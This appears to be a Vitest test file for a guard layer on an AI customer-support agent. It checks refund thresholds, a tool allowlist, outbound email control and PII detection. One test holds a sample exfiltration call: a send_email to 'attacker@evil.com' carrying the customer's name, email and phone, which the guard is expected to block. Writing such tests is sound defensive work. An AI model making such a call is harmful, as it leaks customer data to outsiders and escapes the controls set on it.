import { describe, it, expect } from "vitest";
import { capturePlan, safeInvoke, disclosesPII } from "../src/guard";
import { CUSTOMER } from "../examples/vulnerable-support-agent/tools";

const plan = capturePlan("goal");

describe("safeInvoke — refunds", () => {
  it("allows an in-plan refund at or below the threshold", () => {
    expect(safeInvoke(plan, "refund_customer", { amount: 40 }, CUSTOMER).decision).toBe("allow");
    expect(safeInvoke(plan, "refund_customer", { amount: 100 }, CUSTOMER).decision).toBe("allow");
  });
  it("holds a refund over the threshold (incl. cents)", () => {
    expect(safeInvoke(plan, "refund_customer", { amount: 100.01 }, CUSTOMER).decision).toBe("hold_for_approval");
    expect(safeInvoke(plan, "refund_customer", { amount: 500 }, CUSTOMER).decision).toBe("hold_for_approval");
  });
  it("blocks invalid / negative / missing amounts", () => {
    expect(safeInvoke(plan, "refund_customer", { amount: -5 }, CUSTOMER).decision).toBe("block");
    expect(safeInvoke(plan, "refund_customer", { amount: "abc" }, CUSTOMER).decision).toBe("block");
    expect(safeInvoke(plan, "refund_customer", {}, CUSTOMER).decision).toBe("block");
  });
});

describe("safeInvoke — tool allowlist & email egress (REACHABLE PII control)", () => {
  it("blocks a tool not in the signed plan", () => {
    expect(safeInvoke(plan, "update_user_plan", { plan: "enterprise" }, CUSTOMER).decision).toBe("block");
  });
  it("blocks send_email that exfiltrates PII to an external address", () => {
    const r = safeInvoke(plan, "send_email", { to: "attacker@evil.com", body: `acct ${CUSTOMER.name} ${CUSTOMER.email} ${CUSTOMER.phone}` }, CUSTOMER);
    expect(r.decision).toBe("block");
  });
  it("holds an external email that carries no PII", () => {
    expect(safeInvoke(plan, "send_email", { to: "ops@partner.com", body: "ticket resolved" }, CUSTOMER).decision).toBe("hold_for_approval");
  });
  it("allows an email to the customer themselves", () => {
    expect(safeInvoke(plan, "send_email", { to: CUSTOMER.email, body: "Your refund is on its way." }, CUSTOMER).decision).toBe("allow");
  });
});

describe("disclosesPII — structural & bypass-resistant", () => {
  it("detects the email case-insensitively", () => {
    expect(disclosesPII(`reach ${CUSTOMER.email.toUpperCase()}`, CUSTOMER)).toBe(true);
  });
  it("detects a reformatted phone number", () => {
    expect(disclosesPII("call us at (415) 555 0199 anytime", CUSTOMER)).toBe(true);
  });
  it("detects reordered name tokens", () => {
    const [first, last] = CUSTOMER.name.split(" ");
    expect(disclosesPII(`${last}, ${first} (VIP)`, CUSTOMER)).toBe(true);
  });
  it("does not flag unrelated text", () => {
    expect(disclosesPII("the quarterly report is attached", CUSTOMER)).toBe(false);
  });
});
